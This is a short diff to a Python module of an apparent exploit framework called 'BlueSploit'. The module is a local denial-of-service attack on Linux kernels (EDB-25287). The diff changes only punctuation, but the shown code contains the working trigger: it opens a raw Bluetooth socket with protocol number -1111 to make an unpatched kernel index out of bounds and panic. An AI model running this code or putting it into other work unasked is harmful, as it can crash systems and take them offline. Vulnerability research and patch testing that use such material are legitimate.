@@ -2,7 +2,7 @@
 BlueSploit Module: Linux Kernel HCI Signed Proto DoS
 EDB-ID: 25287  (BID 12911)
 
-Local kernel DoS — opens an AF_BLUETOOTH/SOCK_RAW socket with a
+Local kernel DoS, opens an AF_BLUETOOTH/SOCK_RAW socket with a
 negative protocol number (-1111). On unpatched kernels the signed
 value bypasses the proto bounds check and indexes proto_table[]
 with a negative integer → kernel oops / panic.
@@ -57,13 +57,13 @@ class Module(DosModule):
         print(f"\n  {C.RED}╔{'═'*55}╗{C.RESET}")
         print(f"  {C.RED}║{C.RESET}  {C.BOLD}Linux HCI Signed Proto DoS (EDB-25287){C.RESET}        {C.RED}║{C.RESET}")
         print(f"  {C.RED}╚{'═'*55}╝{C.RESET}\n")
-        print_warning("Targets the LOCAL host kernel — may panic the system")
+        print_warning("Targets the LOCAL host kernel, may panic the system")
         print_info(f"socket(AF_BLUETOOTH={AF_BLUETOOTH}, SOCK_RAW, {proto})")
 
         try:
             s = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, proto)
             s.close()
-            print_success("Socket call returned without panic — kernel patched")
+            print_success("Socket call returned without panic, kernel patched")
             self.add_result({"edb_id": 25287, "vulnerable": False, "proto": proto})
             return True
         except OSError as e:
